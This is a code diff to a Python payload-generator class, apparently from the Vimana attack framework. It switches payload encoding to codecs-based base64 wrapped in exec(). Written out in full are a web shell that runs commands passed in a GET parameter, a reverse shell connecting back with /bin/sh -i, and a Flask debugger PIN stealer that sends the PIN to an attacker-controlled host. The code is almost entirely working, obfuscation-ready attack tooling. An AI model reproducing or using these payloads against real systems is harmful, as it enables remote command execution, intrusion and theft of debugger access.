@@ -1,12 +1,12 @@
-import os
-import random
-import secrets
-from datetime import datetime
-from random import randint, choice
-from mimesis import Generic
 from neotermcolor import colored
+from random import randint, choice
+from datetime import datetime
+from mimesis import Generic
+import secrets
+import random
 import base64
-
+import codecs
+import os
 
 class VMNFPayloads:
     '''Vimana simple payload generators (v0.2)'''
@@ -41,7 +41,6 @@ class VMNFPayloads:
             )
         print()
 
-
     def _encode_payload_(self, payload):
         '''simple base64 payload encoding'''
         
@@ -50,10 +49,10 @@ class VMNFPayloads:
             colored(self.options['payload_type'],'blue')
             )
         )
-        return("exec(" + str(base64.b64encode(payload)) + ".decode('base64'))")
+        return codecs.encode(payload.encode('ascii'),'base64')
 
     def pws_payload(self):
-        """Python base64 encoded web shell payload (via SimpleHTTPRequestHandler().serve_forever() in quiet mode)"""
+        """ Python base64 encoded web shell payload (via SimpleHTTPRequestHandler().serve_forever() in quiet mode)"""
         
         # create a random cmd var for webshell receive attackers commands via GET
         g = Generic('en')
@@ -70,13 +69,15 @@ class VMNFPayloads:
             )
         )
 
-        return(self._encode_payload_("""\nimport os,socket,getpass\ntry:from http.server import SimpleHTTPRequestHandler;import socketserver as SS\nexcept ImportError: from SimpleHTTPServer import SimpleHTTPRequestHandler;import SocketServer as SS\nfrom subprocess import Popen, PIPE\ntry:p2_flag = False;from urllib.parse import urlparse, parse_qs, unquote\nexcept ImportError:p2_flag = True;from urlparse import urlparse,parse_qs,unquote\nclass HRH(SimpleHTTPRequestHandler):\n    def log_message(self, format, *args):pass\n    def do_GET(self):\n        _p_ = "$"\n        _cmd_ ='pwd'\n        self.send_response(200)\n        self.send_header("Content-type", "text/html")\n        self.end_headers()\n        _qc_ = parse_qs(urlparse(self.path).query)\n        if '_cmd_' in _qc_:_cmd_ = _qc_["_cmd_"][0].split()\n        try:process = Popen(_cmd_, stdout=PIPE, stderr=PIPE, universal_newlines=True)\n        except:return\n        stdout, stderr = process.communicate()\n        if os.geteuid() == 0:_p_ = "#"\n        _i_ = "<br>{}{} {}<br>".format(str(getpass.getuser()) + "@" + str(socket.gethostname()), _p_, ' '.join(_cmd_))\n        x ="<html><head><body><font face='monospace'>{}<br><br><br>".format(_i_)\n        for i in stdout.split('\\n'):x += (i + "<br>")\n        x +="</font></body></html>"\n        if p2_flag:self.wfile.write(bytes(x));return\n        self.wfile.write(bytes(x,'utf-8'));return\nSS.TCPServer(("",{_remote_port_}), HRH).serve_forever()\n""".replace("{_remote_port_}",str(remote_port)).replace('_cmd_',xpl_cmd_var).encode('ascii')))
+        e_payload = self._encode_payload_("""\nimport os,socket,getpass\ntry:from http.server import SimpleHTTPRequestHandler;import socketserver as SS\nexcept ImportError: from SimpleHTTPServer import SimpleHTTPRequestHandler;import SocketServer as SS\nfrom subprocess import Popen, PIPE\ntry:p2_flag = False;from urllib.parse import urlparse, parse_qs, unquote\nexcept ImportError:p2_flag = True;from urlparse import urlparse,parse_qs,unquote\nclass HRH(SimpleHTTPRequestHandler):\n    def log_message(self, format, *args):pass\n    def do_GET(self):\n        _p_ = "$"\n        _cmd_ ='pwd'\n        self.send_response(200)\n        self.send_header("Content-type", "text/html")\n        self.end_headers()\n        _qc_ = parse_qs(urlparse(self.path).query)\n        if '_cmd_' in _qc_:_cmd_ = _qc_["_cmd_"][0].split()\n        try:process = Popen(_cmd_, stdout=PIPE, stderr=PIPE, universal_newlines=True)\n        except:return\n        stdout, stderr = process.communicate()\n        if os.geteuid() == 0:_p_ = "#"\n        _i_ = "<br>{}{} {}<br>".format(str(getpass.getuser()) + "@" + str(socket.gethostname()), _p_, ' '.join(_cmd_))\n        x ="<html><head><body><font face='monospace'>{}<br><br><br>".format(_i_)\n        for i in stdout.split('\\n'):x += (i + "<br>")\n        x +="</font></body></html>"\n        if p2_flag:self.wfile.write(bytes(x));return\n        self.wfile.write(bytes(x,'utf-8'));return\nSS.TCPServer(("",{_remote_port_}), HRH).serve_forever()\n""".replace("{_remote_port_}",str(remote_port)).replace('_cmd_',xpl_cmd_var))
+
+        return f"""import codecs\nexec(codecs.decode({e_payload}, 'base64').decode())"""
 
     def olpcb_payload(self):
         """One-liner Python base64 encoded connect back payload (via subprocess.Popen(["/bin/sh","-i"]))"""
         
         # 0-65535 check to prevent overflowerror
-        return(self._encode_payload_(
+        e_payload = self._encode_payload_(
             """import os,\
             socket,\
             subprocess;\
@@ -88,19 +89,19 @@ class VMNFPayloads:
             p=subprocess.Popen(["/bin/sh","-i"],close_fds=True);
             """.format(
                 self.options['local_host'],
-                self.options['local_port']).encode('ascii')
+                self.options['local_port']
             )
         )
         
+        return f"""import codecs\nexec(codecs.decode({e_payload}, 'base64').decode())"""
+
     def flask_pinstealer(self):
         """Python Flask PIN stealer payload"""
         
-        return(self._encode_payload_(
-        """import logging,socket,os\nl = logging.getLogger('werkzeug')\nhandler = logging.FileHandler('/tmp/.t.log')\nl.addHandler(handler)\nP=[line for line in open('/tmp/.t.log').readlines() if "Debugger PIN:" in line]\ns = socket.socket()\ns.connect(('{}',{}))\ns.send(str(P).encode());\ns.close()""".format(
-            self.options['local_host'],
-            self.options['local_port']).encode('ascii')
-            )
+        e_payload = self._encode_payload_(
+        f"""import logging,socket,os\nl = logging.getLogger('werkzeug')\nhandler = logging.FileHandler('/tmp/.t.log')\nl.addHandler(handler)\nP=[line for line in open('/tmp/.t.log').readlines() if "Debugger PIN:" in line]\ns = socket.socket()\ns.connect(('{self.options['local_host']}',{self.options['local_port']}))\ns.send(str(P).encode());\ns.close()"""
         )
-
+        
+        return f"""import codecs\nexec(codecs.decode({e_payload}, 'base64').decode())"""
 
 
